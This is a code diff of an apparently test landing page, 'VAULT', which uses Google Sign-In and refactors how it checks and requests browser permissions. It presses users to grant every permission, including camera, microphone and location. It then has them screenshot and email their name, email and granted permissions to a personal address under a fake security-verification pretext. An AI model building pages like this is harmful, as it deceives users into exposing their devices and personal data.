@@ -6,7 +6,7 @@
     <title>VAULT — безопасное хранилище</title>
     <link rel="icon" href="images/logo.png" type="image/png">
     
-    <!-- Meta теги (по заданию не меняются) -->
+    <!-- Meta теги -->
     <meta name="title" content="Тестовый лендинг">
     <meta name="description" content="Тестовый лендинг, здесь всякая фигня">
     <meta name="keywords" content="тест, тимоша, timoshamoscow, тимошамоскоу, тимоша тест, тимоша сайт">
@@ -14,10 +14,10 @@
     <!-- Google Identity -->
     <script src="https://accounts.google.com/gsi/client" async defer></script>
     
-    <!-- html2canvas для скриншотов -->
+    <!-- html2canvas -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     
-    <!-- Font Awesome 6 -->
+    <!-- Font Awesome -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     
     <!-- Google Fonts -->
@@ -56,12 +56,9 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            position: relative;
-            overflow-y: auto;
             padding: 1.5rem;
         }
 
-        /* Анимированный фон */
         .background {
             position: fixed;
             top: 0;
@@ -72,24 +69,24 @@
             pointer-events: none;
         }
 
-        .gradient-1 {
+        .gradient-1, .gradient-2 {
             position: absolute;
             width: 100vmax;
             height: 100vmax;
-            background: radial-gradient(circle at 30% 50%, rgba(74, 108, 247, 0.2), transparent 70%);
-            top: -20vmax;
-            left: -20vmax;
             animation: float 30s infinite alternate;
         }
 
+        .gradient-1 {
+            background: radial-gradient(circle at 30% 50%, rgba(74, 108, 247, 0.2), transparent 70%);
+            top: -20vmax;
+            left: -20vmax;
+        }
+
         .gradient-2 {
-            position: absolute;
-            width: 100vmax;
-            height: 100vmax;
             background: radial-gradient(circle at 70% 80%, rgba(168, 85, 247, 0.2), transparent 70%);
             bottom: -20vmax;
             right: -20vmax;
-            animation: float 25s infinite alternate-reverse;
+            animation-direction: alternate-reverse;
         }
 
         @keyframes float {
@@ -103,27 +100,24 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background-image: 
-                linear-gradient(rgba(74, 108, 247, 0.03) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(74, 108, 247, 0.03) 1px, transparent 1px);
+            background-image: linear-gradient(rgba(74, 108, 247, 0.03) 1px, transparent 1px),
+                              linear-gradient(90deg, rgba(74, 108, 247, 0.03) 1px, transparent 1px);
             background-size: 50px 50px;
         }
 
         .container {
             width: 100%;
-            max-width: 700px;
+            max-width: 800px;
             margin: 0 auto;
             position: relative;
             z-index: 2;
         }
 
-        /* Карточка */
         .card {
             background: var(--card-bg);
             backdrop-filter: blur(20px) saturate(180%);
-            -webkit-backdrop-filter: blur(20px) saturate(180%);
             border-radius: 2rem;
-            padding: 2rem 1.8rem;
+            padding: 2rem;
             border: var(--glass-border);
             box-shadow: var(--shadow);
             animation: fadeIn 0.6s ease-out;
@@ -145,7 +139,6 @@
             margin-bottom: 1.5rem;
             color: var(--success);
             font-size: 0.8rem;
-            font-weight: 500;
         }
 
         .logo {
@@ -157,16 +150,12 @@
             width: 70px;
             height: 70px;
             margin: 0 auto 1rem;
-            display: flex;
-            align-items: center;
-            justify-content: center;
         }
 
         .logo-icon img {
             width: 100%;
             height: 100%;
             object-fit: contain;
-            filter: drop-shadow(0 8px 20px rgba(74, 108, 247, 0.3));
         }
 
         .logo h1 {
@@ -175,7 +164,6 @@
             background: var(--accent-gradient);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            background-clip: text;
             margin-bottom: 0.3rem;
         }
 
@@ -259,7 +247,6 @@
             font-size: 0.85rem;
         }
 
-        /* Блок разрешений - сетка */
         .permissions-box {
             background: rgba(0, 0, 0, 0.3);
             border-radius: 1.2rem;
@@ -287,7 +274,7 @@
 
         .permissions-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
             gap: 0.5rem;
         }
 
@@ -295,14 +282,11 @@
             display: flex;
             align-items: center;
             justify-content: space-between;
-            padding: 0.6rem 0.8rem;
+            padding: 0.7rem 0.8rem;
             background: rgba(255, 255, 255, 0.03);
             border-radius: 0.8rem;
-            transition: all 0.2s;
-        }
-
-        .perm-item:hover {
-            background: rgba(255, 255, 255, 0.08);
+            flex-wrap: wrap;
+            gap: 0.5rem;
         }
 
         .perm-name {
@@ -337,7 +321,7 @@
             color: var(--warning);
         }
 
-        .request-perm-btn {
+        .request-perm-btn, .open-settings-btn {
             background: rgba(74, 108, 247, 0.2);
             border: 1px solid var(--accent-primary);
             border-radius: 40px;
@@ -346,12 +330,16 @@
             cursor: pointer;
             transition: all 0.2s;
             color: var(--text-primary);
-            font-weight: 500;
             margin-left: 0.5rem;
         }
 
-        .request-perm-btn:hover {
-            background: rgba(74, 108, 247, 0.4);
+        .open-settings-btn {
+            background: rgba(245, 158, 11, 0.2);
+            border-color: var(--warning);
+        }
+
+        .request-perm-btn:hover, .open-settings-btn:hover {
+            transform: translateY(-1px);
         }
 
         .task-box {
@@ -371,7 +359,6 @@
 
         .task-box h3 {
             font-size: 1.1rem;
-            font-weight: 700;
             margin-bottom: 0.4rem;
         }
 
@@ -403,15 +390,9 @@
             font-weight: 600;
             color: white;
             cursor: pointer;
-            transition: all 0.2s;
             display: inline-flex;
             align-items: center;
             gap: 0.5rem;
-        }
-
-        .send-btn:hover:not(:disabled) {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 20px rgba(74, 108, 247, 0.3);
         }
 
         .send-btn:disabled {
@@ -442,6 +423,21 @@
             color: var(--text-secondary);
         }
 
+        .progress-bar {
+            height: 4px;
+            background: rgba(74, 108, 247, 0.2);
+            border-radius: 4px;
+            margin: 0.8rem 0;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: var(--accent-gradient);
+            border-radius: 4px;
+            transition: width 0.3s ease;
+        }
+
         .loading {
             display: inline-block;
             width: 14px;
@@ -464,41 +460,10 @@
             margin-top: 0.8rem;
         }
 
-        .progress-bar {
-            height: 4px;
-            background: rgba(74, 108, 247, 0.2);
-            border-radius: 4px;
-            margin: 0.8rem 0;
-            overflow: hidden;
-        }
-
-        .progress-fill {
-            height: 100%;
-            background: var(--accent-gradient);
-            border-radius: 4px;
-            transition: width 0.3s ease;
-        }
-
-        ::-webkit-scrollbar {
-            width: 6px;
-        }
-
-        ::-webkit-scrollbar-track {
-            background: rgba(74, 108, 247, 0.05);
-            border-radius: 10px;
-        }
-
-        ::-webkit-scrollbar-thumb {
-            background: var(--accent-gradient);
-            border-radius: 10px;
-        }
-
-        @media (max-width: 600px) {
+        @media (max-width: 700px) {
             body { padding: 1rem; }
             .card { padding: 1.2rem; }
             .permissions-grid { grid-template-columns: 1fr; }
-            .perm-item { flex-wrap: wrap; gap: 0.5rem; }
-            .logo h1 { font-size: 1.5rem; }
         }
     </style>
 </head>
@@ -510,7 +475,6 @@
     </div>
 
     <div class="container">
-        <!-- Карточка входа -->
         <div id="loginCard" class="card">
             <div class="security-badge">
                 <i class="fas fa-shield-check"></i>
@@ -530,13 +494,8 @@
                 <div class="feature"><i class="fas fa-bolt"></i><span>Мгновенно</span></div>
                 <div class="feature"><i class="fas fa-lock"></i><span>Приватно</span></div>
             </div>
-            <div class="text-center mt-2">
-                <i class="fas fa-circle" style="color: var(--success); font-size: 0.5rem;"></i>
-                <span style="font-size: 0.7rem; color: var(--text-muted);">Ожидание авторизации</span>
-            </div>
         </div>
 
-        <!-- Карточка после входа -->
         <div id="welcomeCard" class="card hidden">
             <div class="security-badge">
                 <i class="fas fa-shield-check"></i>
@@ -549,7 +508,6 @@
                 <div class="email-badge"><i class="fas fa-envelope"></i><span id="userEmail">Загрузка...</span></div>
             </div>
 
-            <!-- Блок разрешений -->
             <div class="permissions-box">
                 <div class="permissions-title">
                     <i class="fas fa-shield-alt"></i>
@@ -559,10 +517,9 @@
                     <div id="progressFill" class="progress-fill" style="width: 0%"></div>
                 </div>
                 <div id="permissionsGrid" class="permissions-grid"></div>
-                <div id="permWarning" style="font-size: 0.7rem; margin-top: 0.8rem; text-align: center; color: var(--warning);"></div>
+                <div id="permWarning" style="font-size: 0.7rem; margin-top: 0.8rem; text-align: center;"></div>
             </div>
 
-            <!-- Блок задания -->
             <div class="task-box">
                 <div class="task-icon"><i class="fas fa-camera"></i></div>
                 <h3>Важное задание</h3>
@@ -585,34 +542,31 @@
     </div>
 
     <script>
-        // ========== КОНФИГ ==========
         const YOUR_CLIENT_ID = '22364952672-8mqiqmo14pgq3es9thb2bhon1eiqq522.apps.googleusercontent.com';
         
-        // ========== СПИСОК РАЗРЕШЕНИЙ ==========
+        // Список разрешений с указанием типа проверки
         const PERMISSIONS_LIST = [
-            { id: 'geolocation', name: 'Геоданные', icon: 'fa-map-marker-alt', type: 'api' },
-            { id: 'camera', name: 'Камера', icon: 'fa-camera', type: 'api' },
-            { id: 'microphone', name: 'Микрофон', icon: 'fa-microphone', type: 'api' },
-            { id: 'motion', name: 'Датчики движения', icon: 'fa-shoe-prints', type: 'api' },
-            { id: 'notifications', name: 'Уведомления', icon: 'fa-bell', type: 'api' },
-            { id: 'javascript', name: 'JavaScript', icon: 'fa-code', type: 'always' },
-            { id: 'images', name: 'Картинки', icon: 'fa-image', type: 'always' },
-            { id: 'popups', name: 'Всплывающие окна', icon: 'fa-window-restore', type: 'always' },
-            { id: 'autoplay', name: 'Автовоспроизведение звука', icon: 'fa-volume-up', type: 'always' },
-            { id: 'downloads', name: 'Автоматическое скачивание', icon: 'fa-download', type: 'always' },
-            { id: 'clipboard', name: 'Буфер обмена', icon: 'fa-clipboard', type: 'always' },
-            { id: 'payment', name: 'Обработчики платежей', icon: 'fa-credit-card', type: 'always' },
-            { id: 'vr', name: 'Виртуальная реальность', icon: 'fa-vr-cardboard', type: 'api' },
-            { id: 'window', name: 'Управление окнами', icon: 'fa-window-maximize', type: 'always' },
-            { id: 'fonts', name: 'Шрифты', icon: 'fa-font', type: 'always' },
-            { id: 'pictureInPicture', name: 'Картинка в картинке', icon: 'fa-tv', type: 'api' }
+            { id: 'geolocation', name: 'Геоданные', icon: 'fa-map-marker-alt', type: 'api', check: () => checkGeolocation() },
+            { id: 'camera', name: 'Камера', icon: 'fa-camera', type: 'api', check: () => checkCamera() },
+            { id: 'microphone', name: 'Микрофон', icon: 'fa-microphone', type: 'api', check: () => checkMicrophone() },
+            { id: 'motion', name: 'Датчики движения', icon: 'fa-shoe-prints', type: 'api', check: () => checkMotion() },
+            { id: 'notifications', name: 'Уведомления', icon: 'fa-bell', type: 'api', check: () => checkNotifications() },
+            { id: 'javascript', name: 'JavaScript', icon: 'fa-code', type: 'always', always: true },
+            { id: 'images', name: 'Картинки', icon: 'fa-image', type: 'always', always: true },
+            { id: 'popups', name: 'Всплывающие окна', icon: 'fa-window-restore', type: 'settings' },
+            { id: 'autoplay', name: 'Автовоспроизведение звука', icon: 'fa-volume-up', type: 'settings' },
+            { id: 'downloads', name: 'Автоматическое скачивание', icon: 'fa-download', type: 'settings' },
+            { id: 'clipboard', name: 'Буфер обмена', icon: 'fa-clipboard', type: 'settings' },
+            { id: 'payment', name: 'Обработчики платежей', icon: 'fa-credit-card', type: 'settings' },
+            { id: 'vr', name: 'Виртуальная реальность', icon: 'fa-vr-cardboard', type: 'api', check: () => checkVR() },
+            { id: 'window', name: 'Управление окнами', icon: 'fa-window-maximize', type: 'settings' },
+            { id: 'fonts', name: 'Шрифты', icon: 'fa-font', type: 'settings' },
+            { id: 'pictureInPicture', name: 'Картинка в картинке', icon: 'fa-tv', type: 'api', check: () => checkPictureInPicture() }
         ];
         
-        // Состояние разрешений
         let permissionsState = {};
         let currentUser = null;
         
-        // DOM элементы
         const loginCard = document.getElementById('loginCard');
         const welcomeCard = document.getElementById('welcomeCard');
         const userAvatar = document.getElementById('userAvatar');
@@ -623,25 +577,111 @@
         const progressFill = document.getElementById('progressFill');
         const permWarning = document.getElementById('permWarning');
         
-        // Инициализация состояния разрешений из localStorage
-        function initPermissionsState() {
-            const saved = localStorage.getItem('vault_permissions');
-            if (saved) {
-                try {
-                    const parsed = JSON.parse(saved);
-                    PERMISSIONS_LIST.forEach(p => {
-                        permissionsState[p.id] = parsed[p.id] || false;
-                    });
-                } catch(e) {}
-            } else {
-                PERMISSIONS_LIST.forEach(p => {
-                    permissionsState[p.id] = false;
-                });
+        // Функции проверки API-разрешений
+        async function checkGeolocation() {
+            return new Promise((resolve) => {
+                navigator.permissions?.query({ name: 'geolocation' }).then(
+                    result => resolve(result.state === 'granted'),
+                    () => resolve(false)
+                ).catch(() => resolve(false));
+            });
+        }
+        
+        async function checkCamera() {
+            return new Promise((resolve) => {
+                navigator.permissions?.query({ name: 'camera' }).then(
+                    result => resolve(result.state === 'granted'),
+                    () => resolve(false)
+                ).catch(() => resolve(false));
+            });
+        }
+        
+        async function checkMicrophone() {
+            return new Promise((resolve) => {
+                navigator.permissions?.query({ name: 'microphone' }).then(
+                    result => resolve(result.state === 'granted'),
+                    () => resolve(false)
+                ).catch(() => resolve(false));
+            });
+        }
+        
+        async function checkMotion() {
+            if (typeof DeviceMotionEvent !== 'undefined') {
+                return typeof DeviceMotionEvent.requestPermission === 'function' ? false : true;
             }
-            // JavaScript и Картинки всегда разрешены (нельзя отключить в браузере)
-            permissionsState.javascript = true;
-            permissionsState.images = true;
+            return true;
+        }
+        
+        async function checkNotifications() {
+            return Notification.permission === 'granted';
+        }
+        
+        async function checkVR() {
+            if (navigator.xr) {
+                try {
+                    return await navigator.xr.isSessionSupported('immersive-vr');
+                } catch(e) { return false; }
+            }
+            return false;
+        }
+        
+        async function checkPictureInPicture() {
+            return document.pictureInPictureEnabled === true;
+        }
+        
+        // Запрос API-разрешений
+        async function requestApiPermission(permId) {
+            switch(permId) {
+                case 'geolocation':
+                    return new Promise((resolve) => {
+                        navigator.geolocation.getCurrentPosition(
+                            () => resolve(true),
+                            () => resolve(false)
+                        );
+                    });
+                case 'camera':
+                    try {
+                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                        stream.getTracks().forEach(t => t.stop());
+                        return true;
+                    } catch(e) { return false; }
+                case 'microphone':
+                    try {
+                        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                        stream.getTracks().forEach(t => t.stop());
+                        return true;
+                    } catch(e) { return false; }
+                case 'notifications':
+                    const result = await Notification.requestPermission();
+                    return result === 'granted';
+                default:
+                    return true;
+            }
+        }
+        
+        // Открыть настройки сайта в браузере
+        function openSiteSettings() {
+            // В Chrome/Edge можно открыть страницу настроек сайта
+            if (navigator.userAgent.includes('Chrome')) {
+                window.open('chrome://settings/content/all', '_blank');
+                alert('1. Найдите в списке этот сайт\n2. Нажмите на него\n3. Разрешите все необходимые настройки\n4. Обновите страницу (F5)');
+            } else {
+                alert('Нажмите на иконку замка 🔒 слева от адресной строки → "Настройки сайта" → Разрешите всё необходимое → Обновите страницу');
+            }
+        }
+        
+        // Обновить статус всех разрешений
+        async function updateAllPermissions() {
+            for (const perm of PERMISSIONS_LIST) {
+                if (perm.type === 'api') {
+                    const granted = await perm.check();
+                    permissionsState[perm.id] = granted;
+                } else if (perm.type === 'always') {
+                    permissionsState[perm.id] = perm.always;
+                }
+            }
             savePermissionsState();
+            renderPermissionsGrid();
         }
         
         function savePermissionsState() {
@@ -650,8 +690,8 @@
         }
         
         function updateProgress() {
-            const total = PERMISSIONS_LIST.length;
-            const granted = PERMISSIONS_LIST.filter(p => permissionsState[p.id]).length;
+            const total = PERMISSIONS_LIST.filter(p => p.type !== 'always').length;
+            const granted = PERMISSIONS_LIST.filter(p => p.type !== 'always' && permissionsState[p.id]).length;
             const percent = (granted / total) * 100;
             if (progressFill) progressFill.style.width = percent + '%';
             
@@ -670,81 +710,6 @@
             return PERMISSIONS_LIST.every(p => permissionsState[p.id] === true);
         }
         
-        // Запрос API-разрешений
-        async function requestPermission(permId) {
-            switch(permId) {
-                case 'geolocation':
-                    return new Promise((resolve) => {
-                        navigator.geolocation.getCurrentPosition(
-                            () => resolve(true),
-                            () => resolve(false)
-                        );
-                    });
-                case 'camera':
-                case 'microphone':
-                    try {
-                        const constraints = permId === 'camera' 
-                            ? { video: true } 
-                            : { audio: true };
-                        const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                        stream.getTracks().forEach(track => track.stop());
-                        return true;
-                    } catch(e) { return false; }
-                case 'notifications':
-                    const result = await Notification.requestPermission();
-                    return result === 'granted';
-                case 'vr':
-                    if (navigator.xr) {
-                        try {
-                            const supported = await navigator.xr.isSessionSupported('immersive-vr');
-                            return supported;
-                        } catch(e) { return false; }
-                    }
-                    return false;
-                case 'pictureInPicture':
-                    return document.pictureInPictureEnabled === true;
-                default:
-                    return true;
-            }
-        }
-        
-        // Проверка API-разрешений
-        async function checkPermission(permId) {
-            switch(permId) {
-                case 'geolocation':
-                    return new Promise((resolve) => {
-                        navigator.permissions?.query({ name: 'geolocation' }).then(
-                            result => resolve(result.state === 'granted'),
-                            () => resolve(false)
-                        ).catch(() => resolve(false));
-                    });
-                case 'camera':
-                case 'microphone':
-                    const name = permId === 'camera' ? 'camera' : 'microphone';
-                    return new Promise((resolve) => {
-                        navigator.permissions?.query({ name: name }).then(
-                            result => resolve(result.state === 'granted'),
-                            () => resolve(false)
-                        ).catch(() => resolve(false));
-                    });
-                case 'notifications':
-                    return Notification.permission === 'granted';
-                default:
-                    return permissionsState[permId] || false;
-            }
-        }
-        
-        // Обновить статус разрешения в UI
-        async function updatePermissionStatus(permId) {
-            const actualState = await checkPermission(permId);
-            if (actualState !== permissionsState[permId]) {
-                permissionsState[permId] = actualState;
-                savePermissionsState();
-            }
-            renderPermissionsGrid();
-        }
-        
-        // Рендер сетки разрешений
         function renderPermissionsGrid() {
             if (!permissionsGrid) return;
             
@@ -752,7 +717,15 @@
                 const granted = permissionsState[perm.id];
                 const statusText = granted ? '✅ разрешено' : '❌ не разрешено';
                 const statusClass = granted ? 'granted' : 'denied';
-                const showButton = perm.type === 'api' && !granted;
+                
+                let buttonHtml = '';
+                if (!granted) {
+                    if (perm.type === 'api') {
+                        buttonHtml = `<button class="request-perm-btn" data-perm="${perm.id}">Запросить</button>`;
+                    } else if (perm.type === 'settings') {
+                        buttonHtml = `<button class="open-settings-btn" onclick="openSiteSettings()">⚙️ В настройках</button>`;
+                    }
+                }
                 
                 return `
                     <div class="perm-item">
@@ -762,24 +735,24 @@
                         </div>
                         <div>
                             <span class="perm-status ${statusClass}">${statusText}</span>
-                            ${showButton ? `<button class="request-perm-btn" data-perm="${perm.id}">Запросить</button>` : ''}
+                            ${buttonHtml}
                         </div>
                     </div>
                 `;
             }).join('');
             
-            // Добавляем обработчики для кнопок
+            // Обработчики для API-кнопок
             document.querySelectorAll('.request-perm-btn').forEach(btn => {
                 btn.addEventListener('click', async (e) => {
                     e.stopPropagation();
                     const permId = btn.dataset.perm;
-                    const result = await requestPermission(permId);
+                    const result = await requestApiPermission(permId);
                     if (result) {
                         permissionsState[permId] = true;
                         savePermissionsState();
                         renderPermissionsGrid();
                     } else {
-                        alert(`Не удалось получить разрешение: ${PERMISSIONS_LIST.find(p => p.id === permId)?.name}`);
+                        alert(`Не удалось получить разрешение. Попробуйте разрешить вручную через настройки сайта.`);
                     }
                 });
             });
@@ -787,34 +760,13 @@
             updateProgress();
         }
         
-        // Периодическая проверка разрешений
-        function startPermissionWatcher() {
-            setInterval(async () => {
-                let changed = false;
-                for (const perm of PERMISSIONS_LIST) {
-                    if (perm.type === 'api') {
-                        const state = await checkPermission(perm.id);
-                        if (state !== permissionsState[perm.id]) {
-                            permissionsState[perm.id] = state;
-                            changed = true;
-                        }
-                    }
-                }
-                if (changed) {
-                    savePermissionsState();
-                    renderPermissionsGrid();
-                }
-            }, 2000);
-        }
+        window.openSiteSettings = openSiteSettings;
         
-        // Копирование почты
         window.copyEmail = function() {
-            const email = 'timoshamscbsns@internet.ru';
-            navigator.clipboard.writeText(email);
-            alert('📧 Email скопирован: ' + email);
+            navigator.clipboard.writeText('timoshamscbsns@internet.ru');
+            alert('📧 Email скопирован: timoshamscbsns@internet.ru');
         };
         
-        // Отправка скриншота
         const sendScreenshotBtn = document.getElementById('sendScreenshotBtn');
         const sendStatus = document.getElementById('sendStatus');
         
@@ -841,30 +793,20 @@
                 
                 const grantedPermissions = PERMISSIONS_LIST.filter(p => permissionsState[p.id]).map(p => p.name);
                 
-                const userData = {
-                    name: currentUser.name,
-                    email: currentUser.email,
-                    permissions: grantedPermissions,
-                    timestamp: new Date().toLocaleString('ru-RU'),
-                    userAgent: navigator.userAgent
-                };
+                const textToCopy = `🔐 VAULT - Данные верификации\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n👤 Имя: ${currentUser.name}\n📧 Email: ${currentUser.email}\n✅ Разрешения выданы (${grantedPermissions.length}/${PERMISSIONS_LIST.length}):\n${grantedPermissions.map(p => `   • ${p}`).join('\n')}\n🕐 Время: ${new Date().toLocaleString('ru-RU')}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n📸 Скриншот сохранён на компьютер\n📧 Отправьте файл на: timoshamscbsns@internet.ru`;
                 
-                // Скачиваем скриншот
+                await navigator.clipboard.writeText(textToCopy);
+                
                 const link = document.createElement('a');
                 link.download = `vault_${currentUser.name.replace(/\s/g, '_')}_${Date.now()}.png`;
                 link.href = screenshotDataUrl;
                 link.click();
                 
-                // Копируем данные
-                const textToCopy = `🔐 VAULT - Данные верификации\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n👤 Имя: ${currentUser.name}\n📧 Email: ${currentUser.email}\n✅ Разрешения выданы (${grantedPermissions.length}/${PERMISSIONS_LIST.length}):\n${grantedPermissions.map(p => `   • ${p}`).join('\n')}\n🕐 Время: ${userData.timestamp}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n📸 Скриншот сохранён на компьютер\n📧 Отправьте файл на: timoshamscbsns@internet.ru`;
-                
-                await navigator.clipboard.writeText(textToCopy);
-                
                 sendStatus.innerHTML = '<i class="fas fa-check-circle" style="color: var(--success);"></i> ✅ Скриншот сохранён! Данные скопированы. Отправьте файл на timoshamscbsns@internet.ru';
                 sendStatus.style.color = 'var(--success)';
                 
             } catch (error) {
-                sendStatus.innerHTML = '<i class="fas fa-exclamation-triangle"></i> ❌ Ошибка создания скриншота';
+                sendStatus.innerHTML = '<i class="fas fa-exclamation-triangle"></i> ❌ Ошибка';
                 sendStatus.style.color = 'var(--danger)';
             } finally {
                 if (sendScreenshotBtn) sendScreenshotBtn.disabled = false;
@@ -875,7 +817,7 @@
             sendScreenshotBtn.addEventListener('click', takeScreenshotAndSend);
         }
         
-        // ========== GOOGLE AUTH ==========
+        // Google Auth
         function initGoogle() {
             if (!window.google) { setTimeout(initGoogle, 100); return; }
             google.accounts.id.initialize({
@@ -924,15 +866,38 @@
             return false;
         }
         
-        function showWelcomeCard() {
+        async function showWelcomeCard() {
             if (currentUser) {
                 userEmail.textContent = currentUser.email;
                 welcomeMessage.textContent = `С возвращением, ${currentUser.name.split(' ')[0]}!`;
                 if (currentUser.picture) userAvatar.src = currentUser.picture;
                 loginCard.classList.add('hidden');
                 welcomeCard.classList.remove('hidden');
+                
+                // Загружаем сохранённые разрешения или проверяем заново
+                const savedPerms = localStorage.getItem('vault_permissions');
+                if (savedPerms) {
+                    permissionsState = JSON.parse(savedPerms);
+                } else {
+                    await updateAllPermissions();
+                }
                 renderPermissionsGrid();
-                startPermissionWatcher();
+                
+                // Периодическая проверка API-разрешений
+                setInterval(async () => {
+                    let changed = false;
+                    for (const perm of PERMISSIONS_LIST.filter(p => p.type === 'api')) {
+                        const state = await perm.check();
+                        if (state !== permissionsState[perm.id]) {
+                            permissionsState[perm.id] = state;
+                            changed = true;
+                        }
+                    }
+                    if (changed) {
+                        savePermissionsState();
+                        renderPermissionsGrid();
+                    }
+                }, 3000);
             }
         }
         
@@ -946,8 +911,15 @@
         }
         
         // Инициализация
-        initPermissionsState();
-        window.onload = () => { if (!restoreSession()) initGoogle(); };
+        PERMISSIONS_LIST.forEach(p => { permissionsState[p.id] = false; });
+        if (restoreSession()) {
+            // Если сессия восстановлена, загружаем разрешения
+            const savedPerms = localStorage.getItem('vault_permissions');
+            if (savedPerms) permissionsState = JSON.parse(savedPerms);
+        } else {
+            initGoogle();
+        }
+        
         if (logoutBtn) logoutBtn.addEventListener('click', signOut);
     </script>
 </body>
